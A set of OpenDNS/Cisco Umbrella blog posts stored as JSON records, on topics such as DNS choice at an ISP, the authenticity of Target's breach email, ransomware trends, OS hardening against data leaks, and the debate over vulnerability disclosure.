{"website": "Cisco-Umbrella", "title": "Virgin Media (formerly NTL) allows third-party DNS, including OpenDNS", "author": ["OpenDNS Team"], "link": "https://umbrella.cisco.com/blog/virgin-media-ntl-opendns-ok", "abstract": "Last week, Virgin Media, a very large United Kingdom ISP, fixed a configuration which was preventing some of their customers from choosing OpenDNS. The history: last summer, we heard from various NTL customers (Virgin Media was previously known as NTL) that OpenDNS was not an option for them to use, for unknown reasons. My thanks to Adam Ford in the Operations team at Virgin Media for reaching out with the note below, which he kindly gave me permission to post here. Our thanks, too, to those Virgin Media customers who raised the issue. I’m impressed by the proactive steps taken by Adam and his colleagues. Giving your customers choice is good business. The note from Virgin Media I work in the Operations team at Virgin Media, and we’ve been made aware of an issue regarding some of our customers using DNS services off our network — and directed to your blog. This most certainly shouldn’t be the case, so we looked and corrected a configuration issue on a core router in Cambridge. Whilst we do currently have in place DNS caching techniques in order to speed up response times for customers, this should ONLY affect traffic to our own DNS servers. (This ‘DNS caching’ method is currently being replaced.) The configuration error meant some (not all) customers in the Cambridge area would have been forced to use our own DNS servers (transparently redirected). One of our customers has kindly tested this for us since we made the configuration change and confirmed it is now working as expected. Hopefully this ends the story: we always permit use of external DNS servers on our Cable/DSL services. I’d be grateful if you could update your blog to ensure customers know the up to date information (ie, it should work fine :o) ). On behalf of Virgin Media I really do apologise for the disruption this has caused, as it should not have happened. This type of error should be near impossible in the future as mentioned above– the current system is being replaced. Many thanks, Adam Ford Principal Internet Systems Engineer Virgin Media Engineering & Operations", "date": "2007-07-05"},
{"website": "Cisco-Umbrella", "title": "Phishing or official? Target’s “Credit Card Monitoring” Email from BFI0.com", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/phishing-official-targets-credit-card-monitoring-email-bfi0-com", "abstract": "After the Target Credit Card breach this past week affecting over 100,000,000 people, consumers have been on edge about access to personal data. Then this week, reports began to surface about an email that claimed to be from the CEO of Target offering credit card monitoring services: On the surface, the email displayed all the classic signs of a phishing email: The “from” address was from a suspicious domain, bfi0.com The Target logo is not properly displayed The email offers free credit monitoring services, which is a classic phishing scam Social media sources began throwing red flags signaling that the email may have been fraudulent: Target spox says the bfi0(dot)com emails are legit. Why use that domain for a sensitive issue? “We are sending tens of millions of emails” — Geoffrey Fowler (@geoffreyfowler) January 17, 2014 Was this email spam, though? The Email If the email was spam, the first thing to investigate is how millions of copies made it past spam filters. For that, we look at two pieces of information – DKIM and SPF records. DKIM uses cryptography to “prove” who the sender was, and SPF is a tag on websites that show who is allowed to send email from that domain. For the Target email, I looked at the headers and GMail validated both DKIM and SPF for the domain. This meant that bfi0.com sent the email – the “From” address was not being faked. The DKIM and SPF validation also meant that it helped the credibility of the email as it passed through spam filters. Received-SPF: pass (google.com: domain of 11cfdf3aclayfovcia3lqanaaaaaab25u3dxc7ikjmiyaaaaa@target.bfi0.com designates 206.132.3.171 as permitted sender) client-ip=206.132.3.171; Authentication-Results: mx.google.com;\n       spf=pass (google.com: domain of 11cfdf3aclayfovcia3lqanaaaaaab25u3dxc7ikjmiyaaaaa@target.bfi0.com designates 206.132.3.171 as permitted sender) smtp.mail=11cfdf3aclayfovcia3lqanaaaaaab25u3dxc7ikjmiyaaaaa@target.bfi0.com;\n       dkim=pass header.i=@target.bfi0.com\nReturn-Path: <11cfdf3aclayfovcia3lqanaaaaaab25u3dxc7ikjmiyaaaaa@target.bfi0.com>\nDKIM-Signature: v=1; a=rsa-sha1; d=target.bfi0.com; s=ei; c=simple/simple;\n q=dns/txt; i=@target.bfi0.com; t=1389913363;\n h=From:Subject:Date:To:MIME-Version:Content-Type;\n bh=0Tw0KwI1VkkrQDwTITKqSCMS6YA=;\nb=FerspETyfmnYlcbO+Noxgge27afmUdcuFZ9bdu4gyCueCtCWEWUOvFfWgW5ePrRm\nXyJNZy37Mz3YYkAIVYpnL6e2ddvzXvtxCdQduRM0B3PWJa6aWX9u2Uaw+DKietIH\n 8l7gdyBl+IVlaxCimKVkwRpw/bX1jRjjCvh/1H1Vupk=;\nDomainKey-Signature: q=dns; a=rsa-sha1; c=nofws;\n s=ei; d=target.bfi0.com; The Server Now that the Target email can be definitely traced to bfi0.com, we investigate the server to see if it is suspicious. At first glance, visiting the domain gives a blank page – suspicious. However, upon deeper inspection, the domain WhoIs data reveals that it is owned by Epsilon.com – a division of Alliance Data, a $12 Billion publicly-traded marketing services company. Security Graph Inspection The OpenDNS Security Graph shows that bfi0.com is a high-traffic domain – it receives about a quarter as many DNS queries per hour as Target.com. Furthermore, initial algorithmic analysis shows that the domain is benign. Analyzing the IP address behind the domain provides the most telling information about the Target email. The IP address behind bfi0.com hosts over 100 known domains. Some of these are subdomains of well-established websites, including: alerts.chase.com support.firstfederal.com email.amtrak.com email.charter.net email.coldwellbanker.com email.discover.com email.fourseasons.com email.mckinsey.com email.nationalgeographic.com email.sea.samsung.com email.target.com email.target.ca These domains include reputable banks and Fortune 100 companies. The last two domains on the list link the Target corporate website to the server sending emails for bfi0.com. Phishing or Official? The conclusion: Official Based on OpenDNS Security Graph research and DKIM, we can both verify that this email came from the IP address 206.132.3.45 behind bhi0.com, and we can confirm that this server also powers email.target.com. Why did the email come from such an obscure domain? It appears that bfi0.com is the default sending address for an email service used by dozens of Fortune 100 companies. In this case, it appears that Target failed to configure the “from” address to match their domain, email.target.com.", "date": "2014-01-17"},
{"website": "Cisco-Umbrella", "title": "New OpenDNS Data Centers in Canada Eh?! Hello Vancouver and Toronto!", "author": ["Andree Toonk"], "link": "https://umbrella.cisco.com/blog/new-opendns-data-centers-canada-eh-hello-vancouver-toronto-2", "abstract": "In one of our recent blog posts, we mentioned that OpenDNS would continue to expand its global network so that users everywhere have the best and fastest experience possible. We’re happy to announce that we opened two new data centers in Vancouver and Toronto this month. Why Canada? When selecting new locations for data centers, we look at a number of criteria, including the number of users in that region, as well as the transit and peering options that determine our ability to improve services for our users there. Canada is home to our second largest user base, second only to the US. Up to last month, Canadian users were mostly using OpenDNS servers in our New York, Chicago, and Seattle locations. With the addition of the two new data centers, most Canadian users will now be routed to our servers in Vancouver and Toronto. OpenDNS has another special connection to Canada, in addition to having a huge user base there. As you may know, the OpenDNS headquarters is in San Francisco – but we also have a big engineering office in beautiful Vancouver . Having local engineers means that we did not have to fly anyone over–instead, it was a short walk for Chris, one of our network engineers, to the data center in Vancouver. Why did we select Vancouver and Toronto as the new sites? Why not Ottawa and Calgary, or Vernon and Charlottetown ? As Torontonians say, Toronto is the center of the universe. While that’s up for debate, it’s definitely the Internet capital of Canada in terms of connectivity to the rest of the world, making Toronto an obvious choice. In Toronto, we selected the Equinix facility in 151 Front Street, which is the major Internet hub in Toronto. We’re connected to a number of Tier1 providers that provides us with global connectivity. OpenDNS is now also connected to the largest Internet Exchange in Canada, the Toronto Internet Exchange ( TorIX ), which is in that same building. This allows us to have direct connection with many of the other regional networks, making the experience better for users in those networks. The choice for Toronto was relatively easy, but since Canada is a huge country, we wanted to improve the service for Canadians in Western Canada as well. We evaluated multiple cities and data centers before we decided on Vancouver. One of the major differentiators for Vancouver is the recent (re)birth of a new Internet Exchange, the VANIX . We believe that with the new VANIX Internet Exchange and the brand new carrier neutral Cologix facility, Vancouver has the potential to become a major Internet hub for Canada. Both the Vancouver and Toronto site operate dual stack (IPv4 & IPv6) DNS services, in addition to our other security services. This all results in even faster lookups by servers closer to you in Canada. Written by: Andree Toonk and Chris Murray", "date": "2014-05-21"},
{"website": "Cisco-Umbrella", "title": "Easy, Cheap, and Costly: Ransomware is Growing Exponentially", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/easy-cheap-and-costly-ransomware-is-growing-exponentially", "abstract": "Anti-virus companies, Internet security firms, and threat intelligence providers — as well as the security researcher population in general — are all warning of an eruption of ransomware, one fueled by motivated attackers,  cheap infrastructure, and ransomware-as-a-service software. For the uninitiated, ransomware is the currently ubiquitous term for malicious software designed to remotely prevent a user’s access to devices or files until a ransom is paid, usually in the form of Bitcoin . The scenario goes, while using a device or laptop like normal to browse or e-mail or hunt for videos, a sudden message pops up like the one pictured. Now irreplaceable family photos, music files, work documents, tax returns, or any data of value are all inaccessible — unless you pay, of course. An example of a CTB Ransomware demand pop up. As far as cyberattacks go, ransomware is one of the most straightforward in terms of end goal. After an initial compromise — usually through a phishing attempt — the malware infection sits quietly, evading antivirus and malware detection, and sends confirmation to a far-off controller that it has successfully infected a host. Then it gets instruction to lock the device or encrypt files and display a message demanding payment. For now ransomware is only affecting computers. Attackers are largely indiscriminate when picking a target, home machine or office laptop, doesn’t make a difference as long as someone pays. But according to some, there is a real possibility that ransomware model will move to other devices and internet-connected appliances, or even automobiles. Imagine hopping into your car late for the morning commute when up pops a message on the nav screen that it won’t drive until a random e-mail address gets a payment of $250 in Bitcoin. Just days ago, McAfee released a report citing a 58 percent growth in ransomware in Q2 alone. The accelerated growth is attributable to two main causes. First, attacks are cheaper and easier than ever to run. The availability of as-a-service malware options on public Github with helpful YouTube demos lowers the technical bar significantly. And second, those infected by ransomware campaigns seem willing to pay often enough that ransomware continues to be an enticing scheme. The money, according to most estimates, is really good. McAfee’s security report shows the growth of ransomware quarter over quarter. Graphic: McAfee, Inc. OpenDNS Security Researcher Kevin Bottomley demonstrated at BSSides SF earlier this year just how easy and cheap it is to set up a phishing site that spoofs a real login page and looks strikingly legitimate. And in a blog post last month, he laid out the various flavors of ransomware one can encounter regularly. With a cheap phishing site and easy access to malware tools, it’s easier than ever to begin a campaign. As for mitigating ransomware, it can often depend on the type of infection. “It should be noted that not all ransomware is created equal,” Bottomley wrote, “nor do they all act in the same way, but they all tend to leave (for the most part) a footprint that can be used to track and locate where it lives on the Internet.” This footprint means it could be possible to trace where attacks originate and block the related offending IP spaces and hostnames before they infect other users. Protecting PCs individually is more straightforward, for now. A mid-year security report from Cisco security researchers suggests backups as the most effective way of protecting your data. Once files are encrypted by ransomware, be it work spreadsheets or family photos, the data can be nearly impossible to decrypt without a decryption key, which might mean losing it forever. Wiping and restoring is therefore an exercise that might become much more prevalent as a result. “Users can protect themselves from ransomware by backing up their most valuable files,” the Cisco report authors wrote. “Users should also realize that their system could be at risk even after they pay a ransom and decrypt their files.” There are other suggestions for protecting against ransomware attacks including endpoint protection, monitoring network traffic, end-user awareness training for phishing, and others. But the best way to not fear losing data, is knowing you can get it back. Like Jon Jacobi wrote in a simple, useful guide to backing up for PCWorld, it’s best to start backing up now. Yes, now. To test your knowledge of phishing, try our online phishing quiz . If your score is low, it might be time to get some training What are your ransomware suggestions? Share in the comments section or tweet @owen_lystrup or @opendns .", "date": "2015-09-02"},
{"website": "Cisco-Umbrella", "title": "Hardening Your Infrastructure to Mitigate Leaks of Sensitive Data", "author": ["OpenDNS Security Research"], "link": "https://umbrella.cisco.com/blog/hardening-infrastructure-mitigate-leaks-sensitive-data", "abstract": "Using encryption, choosing strong passwords, and properly generating secret keys is often perceived as all it takes to ensure that sensitive data remains confidential. However, the operating system can still be leaking this data. In this blog post, we are going to review some common sources of leaks that are frequently overlooked, even by security professionals. In-memory data Although there is currently a lot of research to mitigate this, sensitive data typically has to be stored unencrypted in memory in order to be processed. Is credit card information safe if it only resides in RAM? As demonstrated by point-of-sale malware such as Dexter and Alina, it is certainly not. These strains of malware do not attempt to inspect the network traffic, where the information is encrypted—instead, they constantly scrape the memory of compromised systems in order to find and exfiltrate the data after it has been decrypted by the system. Accessing the memory doesn’t even require a machine to be compromised by a piece malware. By design, the Firewire and Thunderbolt interfaces found on many modern laptops and workstations provide direct access to the main memory. Tools such as Winlockpwn and more recently Inception make it trivial for anyone to dump the memory of a live system using these interfaces…and the attack will likely go unnoticed. Therefore, sensitive data should be present in memory for the shortest possible amount of time. In particular, plaintext passwords stored in memory should be overwritten with garbage right after having been hashed for storage or verification. The same recommendation applies to web applications processing user-submitted forms. While this shrinks the time window in which data can be exfiltrated, it is not a silver bullet and has to be done at application-level. OS-level mitigation The Inception web site mentions a few ways to stay safe against Firewire/Thunderbolt DMA attacks: Windows: block the SBP-2 driver and remove the Firewire drivers if they are not required OSX: set a firmware password Linux: remove the 1394 drivers In-memory data persistence Operating systems usually do not clear the memory pages used by an application after it exits. They just mark them as “available for reuse” and erase the previous content only when they actually have to be reused by a different application. As a result, passwords used to encrypt files, passwords used for certificate requests, or passwords used to connect to file servers or to get an interactive shell on a remote machine can remain accessible in memory long after the action was done. If a system becomes compromised, live data can be recorded—but a fact frequently overlooked is that sensitive data used in the past may also be present and get exfiltrated. Does your system have a 2+ years uptime? Congratulations. But can you remember everything you did on this system for the past 2 years? OS-level mitigation Grsecurity is an extensive security enhancement to the Linux kernel that defends against a wide range of security threats. In particular, Grsecurity can wipe all the memory pages used by a process as soon as the process exits. In order to do so, the PAX_MEMORY_SANITIZE option has to be enabled. Data swapped out to disk Linux swap partitions (or files), Windows paging files and OSX paging files are used to optimize the amount of available physical memory by temporarily storing less-used memory pages to disk, and copying them back to RAM as needed. For this reason, an unsuspected copy of a top-secret document that was carefully stored only to a USB stick can be present, and remain accessible for a very long time. Web browsers, password managers, file encryption apps, and VPN clients can all be susceptible to having a copy of the in-memory data they use stored to disk, and quitting these apps doesn’t have any effect on what is stored in the paging files. Modern systems also provide the ability to hibernate (“suspend-to-disk”): before powering off the computer, a copy of the memory is stored to disk. When the computer is powered on again, the system can be brought back to the exact state it was in before being powered off. This incredibly useful feature also means that sensitive data present in memory will be stored to disk, and will remain accessible until the system goes to hibernation mode again. Swap and hibernation files/partitions can be encrypted. However, this doesn’t help against attacks on a live system, since the encryption keys are in memory. Other unexpected copies of the memory are also commonly written to disk. In particular, when a process crashes on a UNIX system, a “core” file can be automatically created by the system for post-mortem analysis. This file includes a copy of all the in-memory data used by the process before the crash. Some operating systems provide ways for applications to avoid this behavior for memory pages containing sensitive data. For example, the Linux kernel introduced the MADV_DONTDUMP advice for the madvise() system call. However, one cannot reasonably expect all the applications to properly use this mechanism, or for this mechanism to be available at all. System crashes also happen, and in order to help developers and vendors diagnose and fix the root cause of the crashes, it is common for kernels to dump a full copy of the memory to disk before rebooting. As expected, these dumps can contain sensitive data, and the files can remain available forever if not manually deleted. The Volatility framework makes it easy to analyze most of these dumps, and malware can take advantage of these dumps the same way. OS-level mitigations OSX Hibernation and paging files are encrypted by default since OSX Lion (10.7). This can be checked by entering the command: sysctl -n vm.swapusage Paging can also be totally disabled by removing or renaming the /System/Library/LaunchDaemons/com.apple.dynamic_pager.plist file. Windows Encrypt paging files 1) Open a Command Prompt with Administrator privileges 2) Type: fsutil behavior set encryptpagingfile 1 3) Reboot the system. …or disable paging files 1) Navigate to the Control Panel and click System 2) Select Advanced System Settings 3) In the Advanced tab under the Performance section, click Settings 4) In the Advanced Tab under Virtual Memory section, click Change 5) Untick Automatically manage paging file size for all drives 6) Select each drive listed and select the No paging file radio button for each. Disable kernel crash dumps 1) Navigate to the Control Panel and click System 2) Select Advanced System Settings 3) In the Advanced tab under the Startup and Recovery section, click Settings 4) Under the System Failure section, change the Write debugging information drop down to (none) . Disable hibernation/suspend-to-RAM 1) Open a Command Prompt with Administrator privileges 2) Type powercfg -h off and hit enter. (thanks to @maxrmp for the Windows recommendations) History of shell commands On UNIX systems, interactive shells are often configured to store all the commands that have been typed into files named ~/.zsh_history (zsh), ~/.bash_history (bash) or ~/.sh_history (ksh). Do these commands include confidential data? Then definitely can, especially since applications accepting passwords on the command-line are fairly common. The OpenSSL command-line tool, the ssh-keygen command and the MySQL client are some common examples of tools where important passwords can be given on the command-line, and a copy of these passwords eventually get recorded into the history shell commands. Some shells such as Zsh allow fine-grained control over what should be recorded. Most shells will not record a command stating with a space character. However, on a production system, there is usually no reason to persist the shell history to disk. OS-Level mitigations Replace the ~/.zsh_history , ~/.bash_history and ~/.sh_history files with a symbolic link to /dev/null . Alternatively, set the SAVEHIST environment variable to 0 . Side-channel information leakage Side-channels attacks extract sensitive data from information leaked by implementations processing them. Perhaps the most common side-channel is caused by non-constant time comparisons of passwords and secret keys: if user_entered_password == stored_password:\n    allow_access()\nelse:\n    disallow_access() This is how Python actually performs the strings comparison: if (Py_SIZE(a) == Py_SIZE(b) && a->ob_sval[0] == b->ob_sval[0] && memcmp(a->ob_sval, b->ob_sval, Py_SIZE(a)) == 0) { result = Py_True; } else { result = Py_False; } If the strings do not have the same length, the function directly returns False without any further processing. The first character is compared next. If it is not the same in both strings, the function doesn’t perform any further comparisons and returns False . Eventually, the memcmp() function is called in order to compare the the entire string. Here is an implementation of this function (OpenBSD/amd64): int memcmp(const void s1, const void *s2, size_t n) { if (n != 0) { const unsigned char *p1 = s1, *p2 = s2; do { if ( p1++ != p2++) return ( --p1 - *--p2); } while (--n != 0); } return (0); } Bytes are compared one by one, and the function returns as soon as one difference is found. As a result: Timing differences can be observed when comparing two strings of the same length (no matter what their content is) and when comparing strings of different lengths. No matter what the memcmp() implementation is, timing differences can be observed when the first character of two strings is identical and when it is not. Timing differences can be observed according to the longest common prefix shared by two strings being compared. These timing differences can be used to extract sensitive data such as private keys, locally and remotely. While timing differences are particularly visible in Python and Java, all programming languages behave in a similar way, for obvious performance purposes. A common misconception is that these timing differences are not exploitable due to jitter introduced by the network and by other system activities. However, it has been demonstrated that with enough samples, and by calculating the difference between peaks combined with a percentile range filter, very small differences could still be exploited regardless of the noise. Timing attacks have been successfully used in many scenarios such as extracting private keys from HTTP servers and unlocking the XBOX 360. As we are shifting from dedicated servers to virtualized environments, side-channel attacks should be taken more and more seriously. In particular, CPUs are usually shared by all the processes no matter which container or virtual machine they run in. Branch prediction and shared caches can be abused by a process to learn about what kind of operations another process is performing. In 2005, Percival published a concerning paper on how the “Hyper-Threading” feature of modern Intel CPUs and shared L1 caches can be used to steal secret keys from another process. This attack is still relevant today, even when the processes are running in different containers. More recently, Apecechea, Inci, Eisenbarth and Sunar demonstrated that cross-VM attacks are possible . Their clever attack was conducted on VMWare, as well as the Xen hypervisor used by many virtual machines providers such as Amazon (EC2). In a previous study , Ristenpart, Tromer, Shacham and Savage showed that with little effort and money, an attacker can get an instance assigned to the same physical machine as the target. These attacks remain fairly difficult to conduct, but considering the level of sophistication of some targeted cyber espionage operations we have seen in the past, they should definitely not be ignored. Mitigating side-channel information leakage Although it is not the only side channel that can be exploited, we focused on timing attacks because these are the most practical attacks without physical access. Resisting side-channel attacks is difficult. Ideally, applications should never access specific memory locations or do conditional jumps based on sensitive data. Even cryptographic libraries are not completely immune to side-channel attacks. Numerous timing side channels have been found in major TLS implementations, such as in the recent Lucky 13 attack by Paterson and Al Fardan. For applications processing sensitive data: Favor bare-metal, dedicated servers over shared virtual machines. Disable HyperThreading. Use Hardware Security Modules. This is even an option on Amazon EC2. Do not write your own crypto and make sure that the libraries you are using are always up-to-date.", "date": "2014-10-09"},
{"website": "Cisco-Umbrella", "title": "Customer Success Update: Our First Customer Advisory Board Meeting", "author": ["Chris Doell"], "link": "https://umbrella.cisco.com/blog/customer-success-update-first-customer-advisory-board-meeting", "abstract": "Last week, we brought together a dozen senior security executives from some of our most strategic customers for our inaugural customer advisory board (CAB) meeting. The purpose of this meeting was to gather thought leaders across diverse industries — oil and gas, media and entertainment, financial services, and technology — with the goal of better understanding emerging trends as well as important issues facing our customers when it comes to security. The outcome was even better than we expected: insightful discussions, lively debate, and invaluable feedback to help us shape OpenDNS’s roadmap moving forward. Following the discussion with this group of strategic leaders, I’d like to share a few takeaways on what these collective minds forecasted for the security landscape: There is no silver bullet when it comes to strategic security. The overwhelming consensus was that having an open platform that can easily integrate with multiple security partners is a tremendous asset for customers due to the evolving security landscape. Flexible, open APIs help create a central management and/or visibility point that can greatly improve a company’s security posture. One customer expressed excitement with our FireEye integration by saying that the visibility FireEye provides into packets combined with OpenDNS’s ability to show DNS queries enables a unique and powerful level of insight into their network. The challenge of managing personally identifiable information (PII) continues to shift. Private customer information continues to move organically toward cloud services. One of our customers also shared that many of his employees actually live where they work for months at a time — a uniquely challenging infrastructure in which there is no work/home boundary. With these lines blurring, coupled with so much confidential information moving to the cloud, the need for fast-changing and innovative security solutions around PII is very real. Protection outside of the perimeter IS possible. With the eroding network perimeter, companies are seeking ways to extend their security beyond the walls of their enterprise, and this challenge is one of the many reasons these top-tier customers choose OpenDNS. They want to maintain high visibility into their network activity while simultaneously providing enterprise-class malware protection, all without adding latency to their systems or impacting the productivity of their employees. And for many, it needs to happen both inside and outside of their network perimeter. OpenDNS was fortunate to bring together an incredibly accomplished group of CAB attendees. In addition to sharing their knowledge, experiences, and suggestions with our executive team, these leaders were kind enough to spend some time mingling with OpenDNS employees across all departments. Two of them even joined our senior director of product management for a company-wide “fireside chat.” The best validation for the CAB event’s success was the feedback from attendees themselves. A senior security executive at one of the world’s largest oil and gas companies told us that, “attending the OpenDNS CAB meeting turned out to be extremely profitable use of my time. The hosts and attendees all had plenty of experience and expertise in information security which made for very meaningful discussions and presentations. I am definitely interested in attending future CAB events for the networking and the useful information shared.” In closing, the creation of a customer advisory program is one of the many steps we’ve taken over the past few months to enhance our communication with customers and increase the value that they receive from a partnership in security with OpenDNS. As always, if there’s anything we can do to make your experience with us a great one, please don’t hesitate to reach out to me. On behalf of our team here at OpenDNS, we’d like to wish you have a happy, healthy, and secure holiday season!", "date": "2014-12-18"},
{"website": "Cisco-Umbrella", "title": "Why do we pay Internet Bad Guys?", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/why-pay-internet-bad-guys", "abstract": "Courtesy of Matt Marshall, I was asked to contribute an article to VentureBeat . You can read my article, “Why do we pay Internet Bad Guys?,” in its entirety over there or below. Matt has some really great stuff on VentureBeat, so go check it out! Two weeks ago Auren wrote a dead-on post about the Black Hat Tax that really struck a chord with me. I’ve been paying the Tax for five years with my first company, EveryDNS, and for a few months now with my current start-up, OpenDNS. The problem has become much worse in the last few years. Why? Simply put, bad guys are getting paid. Moreover, the Tax is on users as much as its on businesses. Today we see phishing sites, malware and spyware sites growing at an astounding rate. Consider the example I cite often when discussing the issue with friends: goggle.com (see image below; not providing a link, bad site), the site that might be the most insidious of all typo squatting and malware sites on the Internet. Goggle.com, an obvious typo of google.com, offers an anti-spyware product called SpyBouncer in addition to being filled with pop-up ads (nb: SpyBouncer claims the copyright on the bottom of goggle.com). The website makes a user believe that their computer is currently infected with spyware and that installing SpyBouncer will get rid of it. They say it’s free to try and the program conveniently finds spyware which it will remove for a price, of course. Symantec and others all claim that this product is a total scam and that it neither detects nor repairs spyware with any accuracy. Thanks to the accidental traffic that lands on goggle.com by unsuspecting users, SpyBouncer has no incentive to make a good product, they can just fool a new batch of users everyday. Why does a site like goggle.com exist? Because crime pays, but that’s hardly news. Why it doesn’t get shut down by its webhost (DataPipe) is a good question for another time. What I do want to know is… why is SpyBouncer allowed to run Google ads on its Web site (as they do on the top)? Why are these kinds of abusive software programs allowed to purchase AdWords campaigns luring even more users into this trap? Why is Revenue.net paying SpyBouncer to show ads on goggle.com? Why is Google accepting money from fraudulent advertisers which continues the cycle of malware and spyware? This is why users react so negatively to online advertising. It’s not the relevant and unoffensive advertising that they bemoan, it’s the scams and tricks the advertisers and advertising networks spread around the seedier neighborhoods of the Internet. These kinds of abuse are pretty bad, but what bothers me more is that much of it is being facilitated by companies I respect and admire. People like Ben Edelman have done a lot of research showing the connections between companies like Yahoo and fraudulent advertising practices but that’s not enough. There are so many layers and levels of misdirection that it becomes hard to tell who is paying who and why. As the CEO of a company operating on the Internet, I’m spending money dealing with Internet bad guys who are getting paid to annoy me, my employees and my users. Everyone is wasting their time dealing with this crap while the folks in the money trail keep taking their cut and passing on the buck. When I asked my users what they thought about goggle.com I saw a nearly unanimous response of outrage and frustration. Hundreds of users spoke out on our corporate blog and on sites like Digg.com venting at the absurdity of a site like goggle.com. It’s time that ad networks cleaned up their act and started being more transparent about fraud and abuse. It’s time security companies started fighting the causes of network abuse and not simply the symptoms. There will always be a Black Hat Tax but right now legitimate companies are making it more expensive. That has to stop.", "date": "2006-09-13"},
{"website": "Cisco-Umbrella", "title": "Full Disclosure: Infosec Industry Still Fighting Over Vulnerability Reporting", "author": ["Stephen Lynch"], "link": "https://umbrella.cisco.com/blog/full-disclosure-infosec-industry-still-fighting", "abstract": "The window of time between vulnerability discovery and its subsequent patch can be a quiet, calm process of orchestrating patches across organizations or a mad rush to plug a hole that’s actively being exploited in the wild. It all depends on how vulnerabilities are disclosed and how quickly vendors act to fix the problem. Accordingly, zero day vulnerabilities can be a nightmare for defenders and a dream for attackers. One of the fundamental tensions in the information security industry has been the competing philosophies between vendors and the independent research community when it comes to vulnerability disclosure. Generally, researchers and vendors are driven by a common desire for safer and more secure software. But the ground rules under which collaboration happens still leave much to be desired. Going Full Disclosure Even before security researcher Rain Forest Puppy codified the first “full disclosure” policy, the relationship between security researchers and software vendors has been strained by conflicting motivations, legal threats and accusations of disregard for the security of users. Historically, vendors have claimed that vulnerabilities should be disclosed after a patch is already issued (so-called “responsible” disclosure). This way, they can ensure that their customers are fully protected. On the more enlightened end of the spectrum, vendors proactively engage with researchers who report vulnerabilities, giving them credit and working with them to swiftly fix the problem. However, a cursory look at Attrition.org’s long list of lawsuits and takedown notices targeting security researchers shows that many vendors are not so enlightened. As Wired reports, even security vendors who regularly disclose vulnerabilities in other companies’ products have sued researchers in the past, highlighting the complicated nature of disclosure, even within the information security industry. A tone deaf blog post by Oracle CSO Mary Ann Davidson from earlier this year highlighted this complexity, essentially warning security professionals that they could be sued for reviewing Oracle code for security purposes–a common practice among application security engineers. The common complaint by companies bringing these lawsuits is that their customers’ safety is jeopardized or that intellectual property is compromised by research that exposes design flaws. The “full disclosure” movement was born out of both the legal risk faced by researchers working with vendors, the snail’s pace at which many serious software issues were being fixed and (to some extent) the lack of exposure issues received following private (or “responsible) disclosure. Full disclosure occurs when a researcher publicly posts information about a vulnerability to the general research community, a “name and shame” tactic to force a vendor to patch a publicly known flaw. The term is also the inspiration for the infamous Full Disclosure mailing-list, where several notable zero day vulnerabilities have been announced over the years. Full disclosure is controversial, because it can essentially lead to a race between vendors and online criminals–the first group has to race to put out a patch, while the latter group is sometimes working to leverage the fresh exploit in attacks out in the wild. Even if vendors get their patch out promptly, many end users still don’t patch their machines on a regular basis. By some accounts, nearly half of attacks leverage vulnerabilities that are two years old or more , meaning that criminals are still profiting by exploiting these known vulnerabilities. In the most extreme circumstances, full disclosure can be the equivalent of dropping a zero day vulnerability on an unsuspecting user base. To complicate things further, there are no universal standards for full disclosure. While most researchers give vendors a time limit to respond privately and collaborate on a fix, others have been burned by vendors in the past, and are less collaborative. As independent security analyst Richard Stennion writes in Forbes , a lack of a standard framework for how to disclose vulnerabilities can lead to controversy when vulnerabilities like Heartbleed, which impacted millions of servers and devices around the world, are revealed. Before Heartbleed was disclosed, information about the bug leaked out through various security mailing lists and informal networks of researchers, leading to a pronounced difference in response between the companies that were “in the know” and those who found out when the bug was publicly revealed. Coordination vs. Anti-Collaboration When one vendor discloses a vulnerability in another’s product, things can get even more tricky. While full disclosure is often used to protect researchers from lawsuits that would prevent disclosing a vulnerability, vendors are typically able to shield their own employees from legal action. Instead, cross-company disclosures are typically coordinated to improve the security of mutual customers. There’s a long history of outside vendors working with Adobe and Microsoft on the coordinated disclosure of vulnerabilities in software that is generally considered ubiquitous enterprise environments. The update to Microsoft’s Coordinated Disclosure Policy published on the company’s blog earlier this year is a manifesto of sorts, calling for a better working relationship between companies on this issue. But “name and shame” can still be a motivation for disclosure when companies act as rivals. As eWeek ‘s Sean Michael Kerner reported in January of this year, Google’s regular disclosure of Microsoft zero day flaws–some of which were already patched–has raised some eyebrows about the lack of communication between the two companies. In another instance, FireEye’s announcement that malware targeting routers built by OpenDNS parent company Cisco Systems was marketed in a similar way to zero day vulnerabilities like Heartbleed, but requires administrator access in order to install on targeted systems… essentially requiring that they already be compromised before the malware could be installed. This marketing effort, after Cisco had already warned users about such attacks a month prior, highlights that disclosures between companies can sometimes be more smoke than fire. A Way Forward Even with the loaded history of vulnerability disclosure between vendors and researchers, there are some recent indications that progress is being made. Starting in 2007, the Pwn to Own contest at CanSecWest has slowly evolved into the infosec community’s own equivalent of a game show, where researchers work to trump each other with zero day vulnerabilities against some of today’s most well-known software. Increased media attention at shows like Black Hat and DEF CON has elevated some security researchers to rockstar-like levels of notoriety. Indeed, researchers like Metasploit creator H.D. Moore (who once hosted a “ Month of Browser Bugs ” on his personal blog, dropping over a dozen zero days in less than 30 days) now are infosec industry executives themselves. As the industry has gradually moved away from lawsuits to stop disclosures, a variety of efforts have sprung up to foster a more healthy working relationship between vendors and researchers. The increasing prevalence of bug bounties issued by firms large and small and offering incentives for vulnerability reporting is itself a seismic shift in the way companies have begun to change their stance from reactive to proactive. In 2014, bug bounty firm Bugcrowd announced the first open source framework for vulnerability disclosure , developed alongside legal experts from CipherLaw. This framework provides a way for companies to proactively extend legal protection to researchers and to encourage them to engage directly with vendors in coordinated disclosure. But even as the industry moves to accept (and maybe, embrace) vulnerability disclosures as a valuable tool to increase software security, legal protection for researchers may be the next hurdle for the industry to tackle. As reported by Kim Zetter in WIRED , the National Telecommunications and Information Administration (NTIA) recently held its first-ever meeting on the subject vulnerability disclosure. While the meeting itself was a sign of progress, attendees highlighted how laws like the DMCA may ultimately limit the ability of security researchers to do their jobs.", "date": "2015-10-16"},
